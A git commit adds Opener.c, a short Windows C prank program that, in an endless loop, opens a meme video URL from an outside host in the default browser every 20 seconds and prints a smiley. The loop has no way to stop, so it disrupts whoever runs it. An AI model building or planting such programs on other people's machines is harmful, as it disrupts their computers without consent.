06a87e72aee6bcf48f28a8ee0905fdd223b50631
wawenoter <124440082+wawenoter@users.noreply.github.com>
2025-02-20 20:13:36 +0100

    Add files via upload

---
+++ Opener/Opener.c
@@ -0,0 +1,19 @@
+﻿#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+int main() {
+    const char* url = "https://hostify.ct.ws/uploads/Animan%20Studio%20Bullfighting%20Meme.mp4";
+
+    while (1) {
+        // Uruchomienie linku w domyślnej przeglądarce
+        char command[1024];
+        snprintf(command, sizeof(command), "start %s", url);
+        system(command);
+        printf(":)");
+        // Czekanie 20 sekund
+        Sleep(20000);
+    }
+
+    return 0;
+}
